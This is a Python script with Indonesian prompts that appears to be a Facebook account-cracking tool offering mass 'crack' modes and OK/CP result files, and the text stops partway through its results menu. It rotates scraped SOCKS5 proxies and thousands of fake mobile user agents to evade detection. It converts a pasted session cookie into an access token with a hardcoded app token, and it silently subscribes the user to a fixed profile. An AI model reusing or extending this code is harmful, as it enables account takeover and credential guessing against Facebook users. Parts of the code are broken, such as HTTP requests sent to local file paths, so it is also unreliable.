#/usr/bin/python/#
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from rich.progress import Progress,BarColumn,TextColumn,TimeElapsedColumn
from rich.progress import SpinnerColumn
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
try:
        import rich
except ImportError:
        print('>> Sedang Menginstall Modul Rich <<')
        os.system('pip install rich')
try:
        import stdiomask
except ImportError:
        print('>> Sedang Menginstall Modul Stdiomask <<')
        os.system('pip install stdiomask')
try:
	import requests
except ImportError:
	print('>> Sedang Menginstall Modul Requests & Mechanize <<')
	os.system('pip install requests &&pip install --upgrade pip ')
pretty.install()
CON=sol()
ugen2=[]
ugen=[]
mini=[]
dlvk=[]
noki=[]
vivo=[]
maizu=[]
onebrowser=[]
cokbrut=[]
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
pwpluss,pwnya=[],[]
ses=requests.Session()
princp=[]
sys.stdout.write('\x1b]2; (Simpel Tools) \x07')
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mJaringan Internet Anda Bermasalah')
prox=open('.prox.txt','r').read().splitlines()

 ### RANDOM USER AGENT ####
try:
  vivo = requests.get('data/vivo.txt').text
  open('vivo.txt','w').write(vivo)
except Exception as e:
  vivo = open('data/vivo.txt','r').read().splitlines()
 ### RANDOM USER AGENT ####
try:
  xiomi = requests.get('data/opt.txt').text
  open('opt.txt','w').write(xiomi)
except Exception as e:
  xiomi = open('data/opt.txt','r').read().splitlines()
 ### RANDOM USER AGENT ####
try:
  mini = requests.get('data/opera.txt').text
  open('opera.txt','w').write(mini)
except Exception as e:
  mini = open('data/opera.txt','r').read().splitlines()
# ####USER AGENY###
try:
  dlvk = requests.get('data/dalvik.txt').text
  open('dalvik.txt','w').write(dlvk)
except Exception as e:
  dlvk = open('data/dalvik.txt','r').read().splitlines()
# ####USER AGENY###
try:
  meizu = requests.get('data/meizu.txt').text
  open('meizu.txt','w').write(meizu)
except Exception as e:
  meizu = open('data/meizu.txt','r').read().splitlines()
# ####USER AGENY###
try:
  noki = requests.get('data/nokia.txt').text
  open('nokia.txt','w').write(noki)
except Exception as e:
  noki = open('data/nokia.txt','r').read().splitlines()
  
# ####USER AGENY###

def jawir():
	rr = random.randint
	rc = random.choice
	bahasa = random.choice(["en","fr","ru","tr","id","pt","es","en-GB"])
	ua1 = f"Opera/9.80 (Series 60; Opera Mini/7.1.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
	ua2 = f"Opera/9.80 (Windows Phone; Opera Mini/9.0.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
	ua3 = f"Opera/9.80 (BREW; Opera Mini/6.0.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} {str(rr(100, 590))}X{str(rr(90, 290))} LG"
	ua4 = f"Opera/9.80 (Bada; Opera Mini/6.5/{str(rr(30, 95))}.{str(rr(90, 2290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
	ua5 = f"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Linux; U; Android 2.2; fr-lu; HTC Legend Build/24.838; U; en) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/10.54"
	ua6 = f"UCWEB/2.0(Linux; U; Opera Mini/7.1.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; {bahasa}; GT-I9168I Build/JDQ39) U2/1.0.0 UCBrowser/10.8.8.730 Mobile"
	ua7 = f"Opera/9.80 (Windows NT 6.1; Edition Yx 01) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.17"
	jancok = rc([ua1,ua2,ua3,ua4,ua5,ua6,ua7])
	return jancok
	
	
def new():
	rr = random.randint
	rc = random.choice
	leno = random.choice(["Lenovo S750","Lenovo a1061","Lenovo L78032","Lenovo TB-8505F","Lenovo TB-X6C6X","Lenovo A7700","Lenovo L19041","LM-Q630"])
	sm = random.choice(["SM-E025F","SM-G996B","SM-A826S","SM-E135F","SM-G781B","SM-G998B","SM-F936U1","SM-G361F","SM-A716S","SM-J327AZ","SM-E426B","SM-A015F","SM-A015M","SM-A013G","SM-A013G","SM-A013M","SM-A013F","SM-A022M","SM-A022G","SM-A022F","SM-A025M","SM-S124DL","SM-A025U","SM-A025A","SM-A025G","SM-A025F","SM-A025AZ","SM-A035F","SM-A035M","SM-A035G","SM-A032F","SM-A032M","SM-A032F","SM-A037F","SM-A037U","SM-A037M","SM-S134DL","SM-A037G","SM-A105G","SM-A105M","SM-A105F","SM-A105FN","SM-A102U","SM-A405FN"])
	oppo = random.choice(["CPH1869", "CPH1929","CPH2107", "CPH2238", "CPH2389","CPH2401", "CPH2407", "CPH2413", "CPH2415", "CPH2417", "CPH2419", "CPH2455", "CPH2459", "CPH2461", "CPH2471", "CPH2473", "CPH2477", "CPH8893", "CPH2321", "CPH2341", "CPH2373", "CPH2083", "CPH2071", "CPH2077", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH1923", "CPH1925", "CPH1837", "CPH2015", "CPH2073", "CPH2081", "CPH2029", "CPH2031", "CPH2137", "CPH1605", "CPH1803", "CPH1853", "CPH1805", "CPH1809", "CPH1851", "CPH1931", "CPH1959", "CPH1933", "CPH1935", "CPH1943", "CPH2061", "CPH2069", "CPH2127", "CPH2131", "CPH2139", "CPH2135", "CPH2239", "CPH2195", "CPH2273", "CPH2325", "CPH2309", "CPH1701", "CPH2387", "CPH1909", "CPH1920", "CPH1912", "CPH1901", "CPH1903", "CPH1905", "CPH1717", "CPH1801", "CPH2067", "CPH2099", "CPH2161", "CPH2219", "CPH2197", "CPH2263", "CPH2375", "CPH2339", "CPH1715", "CPH2385", "CPH1729", "CPH1827", "CPH1938", "CPH1937", "CPH1939", "CPH1941", "CPH2001", "CPH2021", "CPH2059", "CPH2121", "CPH2123", "CPH2203", "CPH2333", "CPH2365", "CPH1913", "CPH1911", "CPH1915", "CPH1969", "CPH2209", "CPH1987", "CPH2095", "CPH2119", "CPH2285", "CPH2213", "CPH2223", "CPH2363", "CPH1609", "CPH1613", "CPH1723", "CPH1727", "CPH1725", "CPH1819", "CPH1821", "CPH1825", "CPH1881", "CPH1823", "CPH1871", "CPH1875", "CPH2023", "CPH2005", "CPH2025", "CPH2207", "CPH2173", "CPH2307", "CPH2305", "CPH2337", "CPH1955", "CPH1707", "CPH1719", "CPH1721", "CPH1835", "CPH1831", "CPH1833", "CPH1879", "CPH1893", "CPH1877", "CPH1607", "CPH1611", "CPH1917", "CPH1919", "CPH1907", "CPH1989", "CPH1945", "CPH1951", "CPH2043", "CPH2035", "CPH2037", "CPH2036", "CPH2009", "CPH2013", "CPH2113", "CPH2091", "CPH2125", "CPH2109", "CPH2089", "CPH2065", "CPH2159", "CPH2145", "CPH2205", "CPH2201", "CPH2199", "CPH2217", "CPH1921", "CPH2211", "CPH2235", "CPH2251", "CPH2249", "CPH2247", "CPH2237", "CPH2371", "CPH2293", "CPH2353", "CPH2343", "CPH2359", "CPH2357", "CPH2457", "CPH1983", "CPH1979","CPH2185"])
	bahasa = random.choice(["en-us","fr-fr","tr-tr","id-id","pt-pt","en-GB","ru-ru"])
	ua1 = f"Mozilla/5.0 (Linux; Android {str(rr(4, 13))}; {sm} Build/RP1A.200720.012) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(40, 114))}.0.{str(rr(3500, 5900))}.{str(rr(40, 120))} Mobile Safari/537.36 GNews Android/2022{str(rr(100000, 900000))}"
	ua2 = f"Mozilla/5.0 (Linux; Android {str(rr(4, 13))}; {leno} Build/RKQ1.210420.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(40, 114))}.0.{str(rr(3500, 5900))}.{str(rr(40, 120))} Mobile Safari/537.36 GNews Android/2022{str(rr(100000, 900000))}"
	ua3 = f"Mozilla/5.0 (Linux; Android {str(rr(4, 13))}; {oppo} Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(40, 114))}.0.{str(rr(3500, 5900))}.{str(rr(40, 120))} Mobile Safari/537.36 GNews Android/2022{str(rr(100000, 900000))}"
	jancok = rc([ua1,ua2,ua3])
	return jancok


for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)
	
for t in range(10000):
	a=random.choice([
									"4",
									"5",
									"6",
									"7",
									"8",
									"9",
									"10",
									"11",
									"12",
									"13",
									"9.1.5",
									"5.1.6",
									"4.0.1",
									"3.0.1",
									"4.0.2",
									"5.0.2",
									"6.0.1",
									"6.2.2",
									"7.0.1",
									"7.1.0",
									"8.1.0",
									"4.4.4",
									"5.6.1",
									"6.1.3"
									])
	b=random.choice([
									'en-us',
									'en-gb',
									'id-id',
									'de-de',
									'ru-ru',
									'en-sg',
									'fr-fr',
									'fa-ir',
									'ja-jp',
									'pt-br',
									'cs-cz',
									'zh-hk',
									'zh-cn',
									'vi-vn',
									'en-ph',
									'en-in',
									'tr-tr'
									])
	c=random.choice([
									"Redmi 7",
									"Redmi Note 8",
									"Redmi 6A",
									"Mi 9 Lite",
									"Redmi Note 11 Pro",
									"Redmi 5A",
									"Mi 9 SE",
									"POCO M4 Pro",
									"POCO X3 Pro",
									"Redmi 5 Plus",
									"Redmi Note 10 Pro",
									"M2007J22G",
									"Redmi 9C NFC"
									])
	d=random.choice([
									'OPM1',
									'TP1A',
									'RP1A',
									'PPR1',
									'PKQ1',
									'QP1A',
									'SP1A',
									'RKQ1'
									])
	e=random.choice([
									'001',
									'002',
									'003',
									'004',
									'005',
									'006',
									'007',
									'008',
									'009',
									'010',
									'011',
									'012',
									'013',
									'014',
									'015',
									'016',
									'017',
									'018',
									'019',
									'020'
									])
	f=random.randrange(111111,199999)
	g=random.randrange(10,300)
	h=random.randrange(1111,9999)
	i=random.randrange(20,100)
	j=random.choice([
									"XiaoMi/MiuiBrowser/13.23.2-gn",
									"XiaoMi/MiuiBrowser/13.13.2-gn",
									"XiaoMi/MiuiBrowser/13.16.1-gn",
									"XiaoMi/MiuiBrowser/13.25.2.1-gn",
									"XiaoMi/MiuiBrowser/12.15.3-go",
									"XiaoMi/MiuiBrowser/13.29.0-gn",
									"XiaoMi/MiuiBrowser/13.28.0-gn",
									"XiaoMi/MiuiBrowser/12.7.5-go",
									"XiaoMi/MiuiBrowser/13.28.0-gn",
									"XiaoMi/MiuiBrowser/12.22.0.3-gn"
									])
	kondom1=f'Mozilla/5.0 (Linux; U; Android {a}; {b}; {c} Build/{d}.{f}.{e}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{g}.0.{h}.{i} Mobile Safari/537.36 {j}'
	kondom2=f'Mozilla/5.0 (Linux; U; Android {a}; {b}; {c}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{g}.0.{h}.{i} Mobile Safari/537.36 {j}'
	uaku2 = random.choice([kondom1,kondom2])
	ugen2.append(uaku2)
	
	rc =random.choice
	rr =random.randrange
	az =['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
	a=f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-J120F Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,100))}.0.{str(rr(1800,4900))}.{str(rr(40,150))} Mobile Safari/537.36"
	b=f"Mozilla/5.0 (Linux; U; Android {str(rr(4,12))}; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,100))}.0.{str(rr(1800,4900))}.{str(rr(40,150))} Mobile Safari/537.36 OppoBrowser/2.2.5"
	c=f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; en-US; SM-J120G Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,100))}.{str(rr(10,100))}.0.{str(rr(100,25000))} U3/0.{str(rr(1,100))}.0.Mobile Safari/534.30"
	d=f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SAMSUNG SM-G360H Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.0 Chrome/{str(rr(10,100))}.0.{str(rr(1800,4900))}.{str(rr(40,150))} Mobile Safari/537.36"
	e=f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; vivo Y21 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,100))}.0.{str(rr(1000,4900))}.{str(rr(40,150))} Mobile Safari/537.36 VivoBrowser/{str(rr(10,100))}.{str(rr(10,100))}.{str(rr(10,100))}.{str(rr(10,100))}" 
	f=f"Mozilla/5.0 (Linux; Windows Phone {str(rr(4,12))}; Android {str(rr(4,12))} NOKIA; Lumia 520) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,100))}.0.{str(rr(1800,4900))}.{str(rr(40,150))} Mobile Safari/537.36 Edge/12.0"
	g=f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; A1601) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,100))}.0.{str(rr(1800,4900))}.{str(rr(40,150))} Mobile Safari/537.36"
	h=f"Mozilla/5.0 (Linux; U; Android {str(rr(4,12))}; en-us; GT-{str(rc(az))} {str(rr(10,1000))}{str(rc(az))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,100))}.0.{str(rr(1800,4900))}.{str(rr(40,150))} Mobile Safari/537.36"
	i=f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; RMX2111 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,110))}.0.{str(rr(1800,5900))}.{str(rr(40,150))} Mobile Safari/537.36"
	j=f"Mozilla/5.0 (Linux; Android 10; moto g({str(rr(4,12))}) play Build/QMDS30.47-33-5; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,110))}.0.{str(rr(1800,5900))}.{str(rr(40,150))} Mobile Safari/537.36"
	k=f"Mozilla/5.0 (iPhone; CPU iPhone OS {str(rr(4,16))} like Mac OS X) AppleWebKit/{str(rr(10,1200))}.{str(rr(0,10))}.{str(rr(0,110))} (KHTML, like Gecko) Mobile/20A362"
	l=f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; Redmi Note 8T Build/PKQ1.190616.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,110))}.0.{str(rr(1800,5900))}.{str(rr(40,155))} Mobile Safari/537.36"
	m=f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; JAT-L41 Build/HUAWEIJAT-L41; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,110))}.0.{str(rr(1800,5900))}.{str(rr(40,150))} Mobile Safari/537.36"
	n=f"Mozilla/5.0 (Linux; arm_64; Android {str(rr(4,15))}; IN2025) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,150))}.0.0.0 YaBrowser/{str(rr(1,150))}.{str(rr(1,150))}.{str(rr(1,150))}.{str(rr(1,150))}.00 SA/3 Mobile Safari/537.36"
	o=f"Mozilla/5.0 (Windows NT {str(rr(5,11))}; Win64; x64) eWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,150))}.0.0.0 Safari/537.36"
	p=f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,150))}.0.0.0 Mobile Safari/537.36 EdgA/{str(rr(10,150))}.0.{str(rr(1800,5900))}.{str(rr(10,150))}"
	q=f"Mozilla/5.0 (Linux; U; Android {str(rr(4,12))}; ONEPLUS A6003; Windows 10 Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/{str(rr(10,150))}.0.{str(rr(1800,5900))}.{str(rr(10,150))} Mobile Safari/537.36"
	r=f"Mozilla/5.0 (Series40; Nokia200/{str(rr(1,10))}.{str(rr(1,100))}; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/{str(rr(1,10))}.0.{str(rr(1,10))}.0.{str(rr(1,10))}"
	s=f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; ELITE_Octaplus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,150))}.0.{str(rr(1800,5900))}.{str(rr(10,150))} Safari/537.36 OPR/{str(rr(10,150))}.{str(rr(1,10))}.{str(rr(1800,5900))}.{str(rr(1000,100000))}"
	t=f"Mozilla/5.0 (Windows; U; Windows NT {str(rr(1,12))}.0; en-US; rv:{str(rr(1,10))}.{str(rr(1,10))}a) Gecko/20030403 Phoenix/0.{str(rr(1,10))}"
	u=f"UCWEB/2.0 (Linux; U; Opera Mini/{str(rr(1,12))}.{str(rr(1,12))}.{str(rr(1800,5900))}/.{str(rr(1,100))}.{str(rr(1800,5900))} ; en-US; Lenny4 Build/NRD90M) U2/{str(rr(1,10))}.0.0 UCMini/{str(rr(1,10))}.{str(rr(1,10))}.{str(rr(1,10))}.{str(rr(100,1000))} (SpeedMode; Android {str(rr(4,15))}; Lenny4 Build/NRD90M) Mobile"
	uaku2=str(rc([a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u]))
	ugen.append(uaku2)
	
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()

sir = '\033[41m\x1b[1;97m'
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
A = '\x1b[0;33m'
N = '\x1b[0m'    
E = '\033[38;2;255;127;0;1m'
HA = '\x1b[0;32m'
KU = '\x1b[0;33m'
x = '\33[m'
m = '\x1b[1;91m'
k = '\033[93m'
h = '\x1b[1;92m'
hh = '\033[32m'
u = '\033[95m'
kk = '\033[33m' 
b = '\33[1;96m' 
p = '\x1b[0;34m'
H = ('\x1b[1;90m')
M = ('\x1b[1;91m')
H = ('\x1b[1;92m')
K = ('\x1b[1;93m')
T = ('\x1b[1;94m')
U = ('\x1b[1;95m')
B = ('\x1b[1;96m')
P = ('\x1b[1;97m')
A = "\x1b[38;5;248m"
J = "\x1b[38;5;208m"
Z = "\x1b[0;90m"
asu = random.choice([M,U,K,A,B,E,H,O,P])

dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

def coli(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.03)
def clear():
	os.system('cls')
def back():
	login()

def banner():
  clear()
  print(f"{m}•{k}•{h}•{sir} Pericrot : SESEPUH {x}{m}•{k}•{h}•{x}")

def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()
def login_lagi334():
	try:
		os.system('clear')
		banner()
		your_cookies = input(f'{P}└─Cookie :{asu} ')
		with requests.Session() as r:
			try:
				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})
				data = {'access_token': '867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01','scope': ''}
				response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
				code, user_code = response['code'], response['user_code']
				verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01&callback=LeetsharesCallback'.format(code))
				r.headers.pop('content-type')
				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
				response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					print(f"└─Cookie Invalid...", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()
				else:
					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
					jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
					data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,}
					r.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})
					response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						r.headers.pop('content-type');r.headers.pop('origin')
						response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text
						action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
						fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
						jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
						scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
						display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
						user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
						logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
						auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
						encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
						return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
						r.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})
						data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,}
						response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies}).text
						windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
						r.headers.pop('content-type');r.headers.pop('origin')
						r.headers.update({'referer': 'https://m.facebook.com/',})
						response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text
						if 'Sukses!' in str(response6):
							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
							response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
							print(f"\n{P}└─Token :{asu} {access_token}")
							tokenew = open(".token.txt","w").write(access_token)
							cook= open(".cok.txt","w").write(your_cookies)
							print(f"{P}└─Login Berhasil.... ");exit()
			except Exception as e:
				coli(f"{P}└─Login Gagal.... ")
				os.system('rm -rf .token.txt && rm -rf mcok.txt')
				print(e)
				time.sleep(3)
				back()
	except:pass

def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		requests.post("https://graph.facebook.com/1781113094?fields=subscribers&access_token=%s"%(tokenku))
	except IOError:
		coli(f'└─Cookie Kadaluarsa ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	ip = requests.get("https://api.ipify.org").text
	print(f'{P}>> IP address  : {ip}')
	print(f'{P}─────────────────────────────────────────────────────')
	coli(f'{P}┌─[{H}1{P}] Crack Publik')
	coli(f'{P}├─[{H}2{P}] Crack File')
	coli(f'{P}├─[{H}3{P}] Hasil Crack')
	janda = input(f'└───➢ ')
	if janda in ['1']:
		dump_massal()
	if janda in ['2']:
		dump_file()
	elif janda in ['3']:
		result()
	elif janda in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('[#] Sukses Logout+Hapus Kukis ')
		exit()
	else:
		print('>> Pilih Yang Bener Asu ')
		back()
def error():
	print(f'{k}>> Sepertinya Ada Kesalahan Dalam Memilih Fitur')
	time.sleep(4)
	back()

def result():
	print(f'{P}─────────────────────────────────────────────────────')
	print(f'┌─[{H}1{P}] Hasil {h}OK{P} Anda ')
	print(f'├─[{K}2{P}] Hasil {k}CP{P} Anda ')
	#print(f'├─[{M}3{P}] Kembali	')
	kz = input(f'└───➢ ')
	print(f'{P}─────────────────────────────────────────────────────')
	if kz in ['2']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print('>> File Tidak Di Temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print('>> Anda Tidak Memiliki Hasil CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					
					print(f'{P}├─[{K}%s{P}] Hasil %s ({k} %s {P}Akun )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
					print(f'{P}─────────────────────────────────────────────────────')
			geeh = input(f'└───➢ ')
